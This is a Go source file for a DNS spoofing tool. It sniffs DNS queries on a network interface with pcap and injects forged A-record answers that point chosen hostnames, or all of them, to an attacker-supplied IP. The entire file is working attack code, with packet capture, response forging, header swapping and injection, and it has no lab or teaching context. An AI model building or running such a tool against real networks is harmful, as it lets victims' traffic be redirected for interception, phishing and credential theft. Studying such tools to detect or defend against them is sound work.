package main

import  (
	"fmt"
	"flag"
	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket/layers"
	"log"
	"strings"
	"bufio"
	"os"
	"net"
)

func main() {
	devices, err := pcap.FindAllDevs()
	if err!= nil {
		log.Fatal(err)
	}

	device := flag.String("i", devices[0].Name, "device")
	hostFilename := flag.String("f", "", "hostnames")
	
	flag.Parse()
	
	hostnames := make(map[string]string)
	if *hostFilename != "" {
		file, err := os.Open(*hostFilename)
		if err != nil {
			log.Fatal(err)
		}
		defer file.Close()
		
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.Split(scanner.Text(), " ")
			hostnames[line[1]] = line[0]
		}
	}

	expressionAry := flag.Args()
	expression := strings.Join(expressionAry, " ")
	if expression != "" {
		expression += " and udp port 53"
	} else {
		expression += "udp port 53"
	}

	spoof(*device, hostnames, expression)
}

func spoof(device string, hostnames map[string]string, expression string) {
	var handle *pcap.Handle
	var err error

	// capture from the network device
	handle, err = pcap.OpenLive(device, 1024, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()
	
	fmt.Println("dnsspoof: listening on", device, "\n")

	// use bpf filter to specifies the packets by expression entered by user
	if err := handle.SetBPFFilter(expression); err != nil {
		log.Fatal(err)
	}
	
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		dnsLayer := packet.Layer(layers.LayerTypeDNS).(*layers.DNS)
		ipv4Layer := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
		
		if dnsLayer != nil {
			if dnsLayer.QR {
				continue
			}
			dnsLayer.QR = true
			
			if dnsLayer.QDCount > 0 {
				// assume only one question
				q := dnsLayer.Questions[0]
				if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
					continue
				}
				
				ipStr, target := hostnames[string(q.Name)]
				if len(hostnames) != 0 && !target {
					continue
				}
				
				// create a forged answer
				var a layers.DNSResourceRecord
				a.Name = q.Name
				a.Type = q.Type
				a.Class = q.Class
				a.TTL = 1
				
				if (ipStr == "") {
					a.IP = ipv4Layer.SrcIP
				} else {
					a.IP = net.ParseIP(ipStr)
				}
				
				dnsLayer.Answers = append(dnsLayer.Answers, a)
				dnsLayer.ANCount++
			}
		} else {
			continue
		}
	
		ethLayer := packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)
		if ethLayer != nil {
			temp := ethLayer.SrcMAC
			ethLayer.SrcMAC = ethLayer.DstMAC
			ethLayer.DstMAC = temp
		} else {
			continue
		}
		
		if ipv4Layer != nil {
			temp := ipv4Layer.SrcIP
			ipv4Layer.SrcIP = ipv4Layer.DstIP
			ipv4Layer.DstIP = temp
		} else {
			continue
		}
		
		udpLayer := packet.Layer(layers.LayerTypeUDP).(*layers.UDP)
		if udpLayer != nil {
			temp := udpLayer.SrcPort
			udpLayer.SrcPort = udpLayer.DstPort
			udpLayer.DstPort = temp
		} else {
			continue
		}
		
		err = udpLayer.SetNetworkLayerForChecksum(ipv4Layer)
		if err != nil {
			log.Fatal(err)
		}
		
		forgedResponse := gopacket.NewSerializeBuffer()
		opts := gopacket.SerializeOptions{
			FixLengths: true,
			ComputeChecksums: true,
		}
		err := gopacket.SerializeLayers(forgedResponse, opts, ethLayer, ipv4Layer, udpLayer, dnsLayer)
		if err != nil {
			log.Fatal(err)
		}
		
		err = handle.WritePacketData(forgedResponse.Bytes())
		if err != nil {
			log.Fatal(err)
		}
		
		fmt.Println("Forged response IP", dnsLayer.Answers[0].IP , "for hostname", string(dnsLayer.Answers[0].Name), "has been sent to IP", ipv4Layer.DstIP)
	}
}
